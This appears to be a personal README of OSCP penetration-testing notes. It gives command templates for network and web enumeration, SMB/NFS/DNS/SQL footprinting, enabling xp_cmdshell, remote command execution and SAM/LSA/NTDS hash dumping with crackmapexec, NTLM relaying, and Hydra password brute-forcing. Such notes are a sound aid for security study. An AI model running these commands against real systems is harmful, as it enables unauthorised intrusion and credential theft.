# 0xOSCPNotes
Enumeration, exploitation, and privilege escalation notes, all in one place.


## Table of Contents
- [Enumeration](#enumeration)
  - [Network Scanning](#network-scanning)
  - [Web Enumeration](#web-enumeration)
  - [Footprinting](#footprinting)
    - [FTP](#ftp)
    - [SMB](#smb)
    - [NFS](#nfs)
    - [SQL](#sql)
- [Exploitation](#exploitation)
  - [Attacking Common Services](#attacking-common-services)
    - [Attacking SMB](#attacking-smb)
    - [Attacking SQL](#attacking-sql)
- [Privilege Escalation](#privilege-escalation)
- [Post-Exploitation](#post-exploitation)
- [Resources](#resources)

---

## Enumeration
Details about network scanning, service discovery, and host identification.

### Network-Scanning
nmap service scan
```bash
nmap -sCV -T4 -p- <IP> -oN test_scan.txt
```
nmap udp scan
```bash
namp -sU <IP> --top-ports 100 --min-rate 5000 -oN test_scanudp.txt
```
rustscan with nmap
```bash
rustscan -a <IP> -- -sV -sC -oN nmap_output.txt
```

## Web Enumeration

FFUF directory scan
```bash
ffuf -w ~/Wordlists/SecLists/Discovery/xx:FUZZ -u http://<IP>:x/FUZZ
```
FFUF vHost scan
```bash
ffuf -u http://<IP>.x -c -w ~/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.<IP>.x' -fs 0 
```

Dirsearch directory scan
```bash
dirsearch -h http://<IP>/
```
Nikto Scan
```bash
nikto -h http://<IP>/
```
cewl crawling pages for wordlists
```bash
cewl -d 5 -m 3 http://<IP>/ > TARGET.txt
```

## Footprinting
### FTP
```bash
# Connect to FTP
ftp <IP>

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```
### SMB
```bash
# Connect to SMB share
smbclient //<IP>/<share>

# List Shares
smbclient -L //<IP>//

# Interaction with the target using RPC
rpcclient -U "" <IP>

# Enumerating SMB shares using null session authentication.
crackmapexec smb <IP> --shares -u '' -p '' --shares
```
### NFS
```bash
# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
```
### DNS
```bash
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver.
dig axfr <domain.tld> @<nameserver>
```
### SQL
mysql (add end method if TSL/SSL error appears)
```bash
mysql -h <IP> -u <USER> -p --skip-ssl
```
```bash
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
```
# Exploitation
## Attacking Common Services
### Attacking SMB
```bash
# Network share enumeration using smbmap.
smbmap -H <IP>

# Null-session with the rpcclient.
rpcclient -U'%' <IP>

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb <IP> -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Extract hashes from the SAM database.
crackmapexec smb <IP> -u administrator -p 'Password123!' --sam

# Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t <IP>
```
### Attacking SQL
```bash
# SQL xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```
## Password Attacks
### Password Mutations
```bash
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://TARGET/ -d 4 -m 6 --lowercase -w inlane.wordlist

# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```
### Remote Attacks
```bash
# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# Uses CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses CrackMapExec with admin credentials to dump lsa secrets, over the network.
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses CrackMapExec with admin credentials to dump hashes from the ntds file over a network.
crackmapexec smb <ip> -u <username> -p <password> --ntds

# Uses Hydra to inject a login attack on a HTML http-post-form
hydra -l admin -P 2023-200_most_used_passwords.txt -f <IP> -s 80 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid username or pass"

# Custom password policy
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
